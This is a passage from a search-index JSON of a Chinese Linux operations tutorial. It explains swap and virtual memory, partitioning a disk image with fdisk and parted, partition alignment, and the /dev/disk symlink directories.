\u200b\u5206\u533a\u200b\u4e2d\u200b\uff0c\u200b\u4ee5\u200b\u817e\u51fa\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u7684\u200b\u7a7a\u95f4\u200b\u3002\u200b\u5728\u200b\u7cfb\u7edf\u200b\u4f11\u7720\u200b\uff08hibernate\uff09\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6240\u6709\u200b\u6570\u636e\u200b\u4e5f\u200b\u90fd\u200b\u4f1a\u200b\u5199\u5165\u200b\u5230\u200b swap \u200b\u4e2d\u200b\u3002Swap \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u4e3a\u200b\u6587\u4ef6\u200b\u7684\u200b\u5f62\u5f0f\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u9879\u200b\u529f\u80fd\u200b\u5728\u200b Windows \u200b\u4e0b\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u300c\u200b\u865a\u62df\u5185\u5b58\u200b\u300d\uff0c\u200b\u4f46\u662f\u200b\u4ece\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u7528\u8bed\u200b\u662f\u200b\u4e0d\u200b\u6b63\u786e\u200b\u7684\u200b\u3002\u300c\u200b\u865a\u62df\u5185\u5b58\u200b\u300d\u200b\u5b9e\u9645\u4e0a\u200b\u6307\u4ee3\u200b\u8fd9\u6837\u200b\u4e00\u79cd\u200b\u673a\u5236\u200b\uff1a\u200b\u7a0b\u5e8f\u200b\u770b\u5230\u200b\u7684\u200b\u865a\u62df\u5185\u5b58\u200b\u5730\u5740\u200b\u548c\u200b\u5b9e\u9645\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u662f\u200b\u4e0d\u200b\u4e00\u6837\u200b\u7684\u200b\uff0c\u200b\u7531\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u548c\u200b\u786c\u4ef6\u200b\u7684\u200b\u6620\u5c04\u200b\u673a\u5236\u200b\u8fdb\u884c\u200b\u5173\u8054\u200b\u3002\u200b\u7a0b\u5e8f\u200b\u770b\u5230\u200b\u7684\u200b\u8fde\u7eed\u200b\u7684\u200b\u5730\u5740\u200b\u53ef\u80fd\u200b\u5728\u200b\u7269\u7406\u200b\u4e0a\u200b\u4e0d\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\uff0c\u200b\u751a\u81f3\u200b\u6709\u200b\u53ef\u80fd\u200b\u4e0d\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\uff0c\u200b\u800c\u662f\u200b\u5728\u200b\u5916\u90e8\u200b\u5b58\u50a8\u200b\uff08swap\uff09\u200b\u4e2d\u200b\u3002\u200b\u8fd9\u6837\u7684\u8bdd\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u5728\u200b\u4f7f\u7528\u200b\u5185\u5b58\u200b\u65f6\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u53ef\u80fd\u200b\u8bbf\u95ee\u200b\u5230\u200b\u5176\u4ed6\u200b\u7a0b\u5e8f\u200b\u5185\u5b58\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u540c\u65f6\u200b\u8fd9\u200b\u4e5f\u200b\u5141\u8bb8\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u66f4\u52a0\u200b\u7075\u6d3b\u200b\u5730\u200b\u7ba1\u7406\u200b\u5185\u5b58\u200b\uff08\u200b\u56e0\u4e3a\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u4e25\u683c\u200b\u4fdd\u8bc1\u200b\u5185\u5b58\u200b\u7684\u200b\u8fde\u7eed\u6027\u200b\u8981\u6c42\u200b\uff09\u3002</p> <p>\u200b\u4f20\u7edf\u200b\u4e0a\u200b\uff0cLinux \u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u503e\u5411\u200b\u4e8e\u200b\u7981\u7528\u200b swap\uff0c\u200b\u56e0\u4e3a\u200b\u8fc7\u53bb\u200b\u7684\u200b\u7ecf\u9a8c\u200b\u8ba4\u4e3a\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u78c1\u76d8\u200b\u6027\u80fd\u200b\u8fdc\u200b\u4f4e\u4e8e\u200b\u5185\u5b58\u200b\uff0c\u200b\u4f7f\u7528\u200b swap \u200b\u4f1a\u200b\u5bfc\u81f4\u7cfb\u7edf\u200b\u53d8\u6162\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b\u5185\u5b58\u4e0d\u8db3\u200b\u65f6\u4f1a\u200b\u8ba9\u200b\u5185\u6838\u200b\u7684\u200b OOM Killer \u200b\u66f4\u6162\u200b\u4ecb\u5165\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u79cd\u200b\u89c2\u70b9\u200b\u76ee\u524d\u200b\u88ab\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u8fc7\u65f6\u200b\u7684\u200b\uff0c\u200b\u8be6\u60c5\u200b\u53ef\u200b\u9605\u8bfb\u200b In defense of swap: common misconceptions\uff08\u200b\u4e2d\u6587\u7248\u200b\uff1a\u200b\u66ff\u200b swap \u200b\u8fa9\u62a4\u200b\uff1a\u200b\u5e38\u89c1\u200b\u7684\u200b\u8bef\u89e3\u200b\uff09\u3002\u200b\u6709\u5173\u200b\u5982\u4f55\u200b\u8bbe\u7f6e\u200b\u7528\u6237\u200b\u6001\u200b OOM Killer \u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u53ef\u200b\u53c2\u8003\u200b\u95ee\u9898\u200b\u8c03\u8bd5\u200b\u4e2d\u200b\u7684\u200b\u300c\u200b\u7528\u6237\u200b\u6001\u200b OOM Killer\u300d\u200b\u90e8\u5206\u200b\u3002</p> fdisk \u200b\u64cd\u4f5c\u200b\u793a\u4f8b\u200b <p>fdisk \u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b MBR \u200b\u5206\u533a\u8868\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b GPT \u200b\u5206\u533a\u8868\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>g</code> \u200b\u547d\u4ee4\u200b\u3002 \u200b\u5728\u200b\u521b\u5efa\u200b\u5206\u533a\u200b\u65f6\u200b\uff0c\u200b\u6309\u200b\u56de\u8f66\u200b\u4f7f\u7528\u200b\u9ed8\u8ba4\u200b\u53c2\u6570\u200b\u3002\u200b\u8bbe\u7f6e\u200b\u5206\u533a\u200b\u672b\u5c3e\u200b\u4f4d\u7f6e\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>+</code> \u200b\u8868\u793a\u200b\u76f8\u5bf9\u200b\u4e8e\u200b\u5f53\u524d\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u504f\u79fb\u91cf\u200b\uff08\u200b\u5373\u200b\u5206\u533a\u200b\u5927\u5c0f\u200b\uff09\uff0c\u200b\u6216\u8005\u200b\u4f7f\u7528\u200b <code>-</code> \u200b\u8868\u793a\u200b\u76f8\u5bf9\u200b\u4e8e\u200b\u78c1\u76d8\u200b\u672b\u5c3e\u200b\u7684\u200b\u504f\u79fb\u91cf\u200b\uff08\u200b\u5373\u200b\u5728\u200b\u5c3e\u90e8\u200b\u7559\u51fa\u200b\u591a\u5c11\u200b\u7a7a\u95f4\u200b\uff09\u3002</p> <p>\u200b\u6700\u540e\u200b\u4f7f\u7528\u200b <code>w</code> \u200b\u547d\u4ee4\u200b\u5199\u5165\u200b\u5206\u533a\u8868\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u60f3\u200b\u5b9e\u9645\u200b\u5199\u5165\u200b\u5230\u200b\u78c1\u76d8\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>q</code> \u200b\u9000\u51fa\u200b\u800c\u200b\u4e0d\u200b\u4fdd\u5b58\u200b\u3002 \u200b\u66f4\u200b\u591a\u200b\u4fe1\u606f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>m</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u5e2e\u52a9\u200b\u3002</p> <pre><code>$ fdisk test.img\nWelcome to fdisk (util-linux 2.39.3).\nChanges will remain in memory only, until you decide to write them.\nBe careful before using the write command.\n\nDevice does not contain a recognized partition table.\nCreated a new DOS (MBR) disklabel with disk identifier 0xb7358160.\n\nCommand (m for help): g\nCreated a new GPT disklabel (GUID: E19C12C2-CAB9-4A9A-88D5-2F389F7B4452).\n\nCommand (m for help): n\nPartition number (1-128, default 1): \nFirst sector (2048-16777182, default 2048): \nLast sector, +/-sectors or +/-size{K,M,G,T,P} (2048-16777182, default 16775167): +256M\n\nCreated a new partition 1 of type 'Linux filesystem' and of size 256 MiB.\n\nCommand (m for help): n\nPartition number (2-128, default 2): \nFirst sector (526336-16777182, default 526336): \nLast sector, +/-sectors or +/-size{K,M,G,T,P} (526336-16777182, default 16775167): +1G\n\nCreated a new partition 2 of type 'Linux filesystem' and of size 1 GiB.\n\nCommand (m for help): n\nPartition number (3-128, default 3): \nFirst sector (2623488-16777182, default 2623488): \nLast sector, +/-sectors or +/-size{K,M,G,T,P} (2623488-16777182, default 16775167): \n\nCreated a new partition 3 of type 'Linux filesystem' and of size 6.7 GiB.\n\nCommand (m for help): t\nPartition number (1-3, default 3): 1\nPartition type or alias (type L to list all): L\n\uff08\u200b\u7701\u7565\u200b\uff09\nPartition type or alias (type L to list all): 1\n\nChanged type of partition 'Linux filesystem' to 'EFI System'.\n\nCommand (m for help): t\nPartition number (1-3, default 3): 2\nPartition type or alias (type L to list all): 19\n\nChanged type of partition 'Linux filesystem' to 'Linux swap'.\n\nCommand (m for help): p\nDisk test.img: 8 GiB, 8589934592 bytes, 16777216 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: E19C12C2-CAB9-4A9A-88D5-2F389F7B4452\n\nDevice       Start      End  Sectors  Size Type\ntest.img1     2048   526335   524288  256M EFI System\ntest.img2   526336  2623487  2097152    1G Linux swap\ntest.img3  2623488 16775167 14151680  6.7G Linux filesystem\n\nCommand (m for help): w\nThe partition table has been altered.\nSyncing disks.\n</code></pre> parted \u200b\u64cd\u4f5c\u200b\u793a\u4f8b\u200b <p>\u200b\u8fd9\u91cc\u200b\u4e0d\u200b\u63a8\u8350\u200b\u4ea4\u4e92\u5f0f\u200b\u4f7f\u7528\u200b <code>parted</code>\uff0c\u200b\u56e0\u4e3a\u200b\u5176\u200b\u4ea4\u4e92\u200b\u4e0d\u5982\u200b <code>fdisk</code> \u200b\u76f4\u89c2\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6240\u6709\u200b\u64cd\u4f5c\u200b\u5747\u200b\u4e3a\u200b\u7acb\u523b\u200b\u5199\u5165\u200b\u3002\u200b\u4f46\u662f\u200b <code>parted</code> \u200b\u5728\u200b\u811a\u672c\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u66f4\u52a0\u200b\u65b9\u4fbf\u200b\u3002 parted \u200b\u811a\u672c\u200b\u7684\u200b\u4f8b\u5b50\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b 101strap \u200b\u811a\u672c\u200b\u3002</p> <pre><code>$ parted -a optimal test.img  # \u200b\u4f7f\u7528\u200b optimal \u200b\u53c2\u6570\u200b\uff0c\u200b\u5728\u200b\u521b\u5efa\u200b\u65b0\u200b\u5206\u533a\u200b\u65f6\u200b\u4f7f\u7528\u200b\u6700\u4f73\u200b\u5bf9\u9f50\u200b\nWARNING: You are not superuser.  Watch out for permissions.\nGNU Parted 3.6\nUsing /home/taoky/tmp/201/test.img\nWelcome to GNU Parted! Type 'help' to view a list of commands.\n(parted) mklabel gpt\n(parted) mkpart efi 0% 256M\n(parted) mkpart swap 256M 1289M\n(parted) mkpart rootfs 1289M 100%\n(parted) set 1 esp\nNew state?  [on]/off?\n(parted) set 2 swap\nNew state?  [on]/off?\n(parted) print\nModel:  (file)\nDisk /home/taoky/tmp/201/test.img: 8590MB\nSector size (logical/physical): 512B/512B\nPartition Table: gpt\nDisk Flags: \n\nNumber  Start   End     Size    File system  Name    Flags\n1      1049kB  256MB   255MB                efi     boot, esp\n2      256MB   1289MB  1033MB               swap    swap\n3      1289MB  8589MB  7300MB               rootfs\n\n(parted) quit\n</code></pre> <p>\u200b\u5728\u200b\u521b\u5efa\u200b\u540e\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>file</code> \u200b\u548c\u200b <code>fdisk</code> \u200b\u5de5\u5177\u200b\u9a8c\u8bc1\u200b\u5206\u533a\u8868\u200b\u7684\u200b\u7c7b\u578b\u200b\uff1a</p> <pre><code>$ file test.img  # MBR \u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u5206\u533a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5206\u533a\u200b ID \u200b\u4e3a\u200b 0xee\uff0c\u200b\u4ee3\u8868\u200b\u8be5\u200b\u78c1\u76d8\u955c\u50cf\u200b\u4f7f\u7528\u200b GPT\ntest.img: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 16777215 sectors, extended partition table (last)\n$ fdisk -l test.img\nDisk test.img: 8 GiB, 8589934592 bytes, 16777216 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: E19C12C2-CAB9-4A9A-88D5-2F389F7B4452\n\nDevice       Start      End  Sectors  Size Type\ntest.img1     2048   526335   524288  256M EFI System\ntest.img2   526336  2623487  2097152    1G Linux swap\ntest.img3  2623488 16775167 14151680  6.7G Linux filesystem\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5bf9\u200b GPT \u200b\u7684\u200b\u7ec6\u8282\u200b\u611f\u5174\u8da3\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u5341\u516d\u8fdb\u5236\u200b\u7f16\u8f91\u5668\u200b\u67e5\u770b\u200b\u955c\u50cf\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5e76\u200b\u4e0e\u200b GPT \u200b\u6807\u51c6\u200b\u5bf9\u7167\u200b\u3002</p> \u200b\u5206\u533a\u200b\u5bf9\u9f50\u200b <p>\u200b\u89c2\u5bdf\u200b fdisk \u200b\u7684\u200b\u8f93\u51fa\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u4e00\u4e9b\u200b\u6709\u8da3\u200b\u7684\u200b\u5730\u65b9\u200b\uff1a\u200b\u67e5\u627e\u200b\u8d44\u6599\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b\uff0cGPT \u200b\u5206\u533a\u8868\u200b\u672c\u8eab\u200b\u53ea\u200b\u9700\u8981\u200b 34 \u200b\u4e2a\u200b\u6247\u533a\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0a\u200b\u6587\u4e2d\u200b\u9996\u4e2a\u200b\u5206\u533a\u200b\u5374\u200b\u4ece\u200b\u7b2c\u200b 2048 \u200b\u4e2a\u200b\u6247\u533a\u200b\u5f00\u59cb\u200b\u3002 \u200b\u8fd9\u662f\u200b\u57fa\u4e8e\u200b\u5c06\u200b\u5206\u533a\u200b\u4e0e\u200b\u7269\u7406\u200b\u8bbe\u5907\u200b\u7684\u200b\u6247\u533a\u200b/\u200b\u8bbf\u95ee\u200b\u8fb9\u754c\u200b\u300c\u200b\u5bf9\u9f50\u200b\u300d\u200b\u7684\u200b\u8003\u8651\u200b\u3002</p> <p>\u200b\u5728\u5b9e\u8df5\u4e2d\u200b\u6211\u4eec\u200b\u4e00\u822c\u200b\u91c7\u53d6\u200b 4K\uff088 \u200b\u4e2a\u200b\u6247\u533a\u200b\uff09\u200b\u5bf9\u9f50\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8d77\u59cb\u200b\u4f4d\u7f6e\u200b\u9700\u8981\u200b\u4e3a\u200b 4K\uff088 \u200b\u4e2a\u200b\u6247\u533a\u200b\uff09\u200b\u7684\u200b\u6574\u6570\u500d\u200b\u3002 2048 \u200b\u4e2a\u200b\u6247\u533a\u200b\u5373\u200b 1M\uff0c\u200b\u662f\u200b\u73b0\u4ee3\u200b\u7248\u672c\u200b fdisk \u200b\u7684\u200b\u9ed8\u8ba4\u200b\u5bf9\u9f50\u200b\u7c92\u5ea6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5e94\u5bf9\u200b\u672a\u6765\u200b\u7684\u200b\u5bf9\u9f50\u200b\u9700\u6c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5408\u7406\u200b\u4e14\u200b\u88ab\u200b\u666e\u904d\u200b\u4f7f\u7528\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</p> <p><code>/dev/disk</code></p> <p>\u200b\u5728\u200b Linux \u200b\u4e2d\u200b\uff0c\u200b\u786c\u76d8\u200b\u8bbe\u5907\u200b\u7684\u200b\u8bbe\u5907\u200b\u6587\u4ef6\u540d\u200b\u4e0d\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b\uff0c\u200b\u5982\u679c\u200b\u673a\u5668\u200b\u6709\u200b\u591a\u4e2a\u200b\u786c\u76d8\u200b\uff0c\u200b\u5c31\u200b\u53ef\u80fd\u200b\u53d1\u751f\u200b\u91cd\u542f\u200b\u524d\u200b\u540d\u4e3a\u200b <code>sda</code> \u200b\u7684\u200b\u8bbe\u5907\u200b\u91cd\u542f\u200b\u4e4b\u540e\u200b\u53d8\u6210\u200b\u4e86\u200b <code>sdb</code>  \u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002Linux \u200b\u7684\u200b\u7528\u6237\u200b\u6001\u200b\u8bbe\u5907\u200b\u7ba1\u7406\u5668\u200b udev \u200b\u4f1a\u200b\u5728\u200b <code>/dev/disk</code> \u200b\u4e0b\u200b\u6839\u636e\u200b\u4e0d\u540c\u200b\u5206\u7c7b\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u786c\u76d8\u200b/\u200b\u5206\u533a\u200b\u5230\u200b\u5b9e\u9645\u200b\u8bbe\u5907\u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\u3002 \u200b\u5176\u200b\u547d\u540d\u200b\u4e0d\u4f1a\u200b\u5728\u200b\u91cd\u542f\u200b\u540e\u200b\u53d8\u5316\u200b\u3002\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>$ tree /dev/disk/\n/dev/disk/\n\u251c\u2500\u2500 by-diskseq\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 1 -&gt; ../../nvme0n1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 1-part1 -&gt; ../../nvme0n1p1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 1-part2 -&gt; ../../nvme0n1p2\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 1-part3 -&gt; ../../nvme0n1p3\n\u251c\u2500\u2500 by-id\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-eui.0000000001000000e4d25c8003505301 -&gt; ../../nvme0n1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-eui.0000000001000000e4d25c8003505301-part1 -&gt; ../../nvme0n1p1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-eui.0000000001000000e4d25c8003505301-part2 -&gt; ../../nvme0n1p2\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-eui.0000000001000000e4d25c8003505301-part3 -&gt; ../../nvme0n1p3\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-INTEL_SSDPEKNU020TZ_PHKA119600MK2P0C -&gt; ../../nvme0n1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-INTEL_SSDPEKNU020TZ_PHKA119600MK2P0C_1 -&gt; ../../nvme0n1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-INTEL_SSDPEKNU020TZ_PHKA119600MK2P0C_1-part1 -&gt; ../../nvme0n1p1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-INTEL_SSDPEKNU020TZ_PHKA119600MK2P0C_1-part2 -&gt; ../../nvme0n1p2\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-INTEL_SSDPEKNU020TZ_PHKA119600MK2P0C_1-part3 -&gt; ../../nvme0n1p3\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-INTEL_SSDPEKNU020TZ_PHKA119600MK2P0C-part1 -&gt; ../../nvme0n1p1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 nvme-INTEL_SSDPEKNU020TZ_PHKA119600MK2P0C-part2 -&gt; ../../nvme0n1p2\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 nvme-INTEL_SSDPEKNU020TZ_PHKA119600MK2P0C-part3 -&gt; ../../nvme0n1p3\n\u251c\u2500\u2500 by-label\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 SYSTEM -&gt; ../../nvme0n1p1\n\u251c\u2500\u2500 by-partlabel\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 EFI\\x20system\\x20partition -&gt; ../../nvme0n1p1\n\u251c\u2500\u2500 by-partuuid\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 370b0fef-f3fc-4378-a083-c520fc25ccc4 -&gt; ../../nvme0n1p1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 4f2efc48-47e2-f145-828d-af8b385073fc -&gt; ../../nvme0n1p3\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 dd06687c-6b2a-5847-ae83-5c30c21f26cf -&gt; ../../nvme0n1p2\n\u251c\u2500\u2500 by-path\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pci-0000:02:00.0-nvme-1 -&gt; ../../nvme0n1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pci-0000:02:00.0-nvme-1-part1 -&gt; ../../nvme0n1p1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pci-0000:02:00.0-nvme-1-part2 -&gt; ../../nvme0n1p2\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 pci-0000:02:00.0-nvme-1-part3 -&gt; ../../nvme0n1p3\n\u2514\u2500\u2500 by-uuid\n    \u251c\u2500\u2500 0E62-46C6 -&gt; ../../nvme0n1p1\n    \u251c\u2500\u2500 6c80c677-34e3-4380-8a0e-667a3d7f29e7 -&gt; ../../nvme0n1p2\n    \u2514\u2500\u2500 f744de26-960b-4f60-ba3c-818d5b38c926 -&gt; ../../nvme0n1p3\n\n8 directories, 28 files\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u5e38\u89c1\u200b\u7684\u200b\u76ee\u5f55\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u51e0\u9879\u200b\uff1a</p> by-label <p>\u200b\u7edd\u5927\u90e8\u5206\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u90fd\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u4e3a\u200b\u5176\u200b\u8bbe\u7f6e\u200b\u300c\u200b\u6807\u7b7e\u200b\u300d\u3002Windows \u200b\u7528\u6237\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5f88\u200b\u719f\u6089\u200b\u8fd9\u4e2a\u200b\u7279\u6027\u200b\uff0c \u200b\u56e0\u4e3a\u200b\u5728\u200b\u300c\u200b\u6b64\u200b\u7535\u8111\u200b\u300d\u200b\u4e2d\u200b\u663e\u793a\u200b\u3001\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u5206\u533a\u200b\u540d\u79f0\u200b\u5c31\u662f\u200b\u8fd9\u91cc\u200b\u7684\u200b label\u3002</p> by-partlabel <p>\u200b\u8fd9\u4e2a\u200b\u300c\u200b\u6807\u7b7e\u200b\u300d\u200b\u5b58\u50a8\u200b\u5728\u200b GPT \u200b\u5206\u533a\u8868\u200b\u4e2d\u200b\uff08\u200b\u800c\u200b\u975e\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\uff09\uff0c\u200b\u4e0d\u200b\u968f\u7740\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u6539\u53d8\u200b\u800c\u200b\u53d8\u5316\u200b\u3002</p> by-uuid <p>\u200b\u7531\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u63d0\u4f9b\u200b\u7684\u200b\u552f\u4e00\u200b\u6807\u8bc6\u7b26\u200b\u4fe1\u606f\u200b\u3002\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\uff0c\u200b\u8fd9\u91cc\u200b EFI \u200b\u5206\u533a\u200b\u7531\u4e8e\u200b\u662f\u200b FAT32\uff0c\u200b\u56e0\u6b64\u200b\u5b83\u200b\u7684\u200b UUID \u200b\u76f8\u6bd4\u200b\u5176\u4ed6\u200b\u7684\u200b\u77ed\u200b\u5f97\u200b\u591a\u200b\u3002</p> by-partuuid <p>\u200b\u7531\u200b GPT \u200b\u5206\u533a\u8868\u200b\u63d0\u4f9b\u200b\u7684\u200b\u552f\u4e00\u200b\u6807\u8bc6\u7b26\u200b\u4fe1\u606f\u200b\u3002</p> by-id <p>\u200b\u6839\u636e\u200b\u8bbe\u5907\u200b\u7684\u200b\u5e8f\u5217\u53f7\u200b\u7b49\u200b\u4fe1\u606f\u200b\u63d0\u4f9b\u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\uff0c\u200b\u5206\u533a\u200b\u5219\u200b\u4ee5\u200b -partN \u200b\u7684\u200b\u5f62\u5f0f\u200b\u63d0\u4f9b\u200b\u3002</p> by-path <p>\u200b\u6839\u636e\u200b\u7cfb\u7edf\u200b sysfs \u200b\u63d0\u4f9b\u200b\u7684\u200b\u4fe1\u606f\u200b\u521b\u5efa\u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>pci-0000:02:00.0-nvme-1</code> \u200b\u5bf9\u5e94\u200b\u4e86\u200b\uff1a</p> <pre><code>$ pwd\n/sys/block\n$ ls -lha\ntotal 0\ndrwxr-xr-x  2 root root 0 Feb 29 15:58 ./\ndr-xr-xr-x 13 root root 0 Feb 29 15:58 ../\nlrwxrwxrwx  1 root root 0 Feb 27 18:24 nvme0n1 -&gt; ../devices/pci0000:00/0000:00:06.0/0000:02:00.0/nvme/nvme0/nvme0n1/\n</code></pre> <p>\u200b\u5373\u4f7f\u200b\u5bf9\u4e8e\u200b\u5355\u200b\u786c\u76d8\u200b\u7684\u200b\u7528\u6237\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5728\u200b\u4e00\u4e9b\u200b\u5730\u65b9\u200b\u4f7f\u7528\u200b\u5230\u200b\uff08\u200b\u4f8b\u5982\u200b\u914d\u7f6e\u200b GRUB \u200b\u542f\u52a8\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\uff09\u3002 \u200b\u5e76\u4e14\u200b\u6709\u200b\u5fc5\u8981\u200b\u5c0f\u5fc3\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b label/uuid \u200b\u4e0e\u200b GPT \u200b\u5206\u533a\u8868\u200b\u7684\u200b label/uuid \u200b\u7684\u200b\u533a\u522b\u200b\uff1a \u200b\u4f8b\u5982\u200b\u683c\u5f0f\u5316\u200b\u4e3a\u200b\u65b0\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u540e\u200b\uff0c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u4fe1\u606f\u200b\u4f1a\u200b\u88ab\u200b\u91cd\u7f6e\u200b\uff1b\u200b\u800c\u200b\u5728\u200b\u865a\u62df\u5316\u200b\u573a\u666f\u200b\u8fdb\u884c\u200b\u5206\u533a\u200b\u6269\u5bb9\u200b\u540e\u200b\uff0cGPT \u200b\u5206\u533a\u8868\u200b\u4e2d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5206\u533a\u200b\u4fe1\u606f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u88ab\u200b\u91cd\u7f6e\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#filesystem","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u200b\u4e0b\u8868\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u5e38\u89c1\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002\u200b\u5728\u200b\u67d0\u4e9b\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u4e00\u90e8\u5206\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5b89\u88c5\u200b\u7b2c\u4e09\u65b9\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5b9e\u73b0\u200b\u652f\u6301\u200b\uff0c\